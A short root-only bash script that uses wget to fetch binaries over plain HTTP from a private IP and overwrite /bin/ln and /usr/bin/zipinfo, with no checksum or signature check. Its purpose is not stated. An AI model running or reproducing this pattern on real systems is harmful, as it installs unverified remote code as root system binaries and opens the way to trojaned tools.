#!/bin/bash

function checkuser() {
    #whoami
    if [ "$USER" != "root" ]; then
        echo "Please run this command with sudo or root"
        exit 1
    fi
}

function update_binary() {
    local cmd=$1
    local name=$(basename $cmd)
    if [ ! -f "${cmd}" ]; then
        echo "error: ${cmd} is not existed!"
        exit 1
    fi

    echo "update ${cmd}"
    rm -rf ${name}
    wget http://192.168.0.193/packages/linux/${name} && chmod a+x ${name} && mv ${name} ${cmd}
}

checkuser

update_binary /bin/ln
update_binary /usr/bin/zipinfo
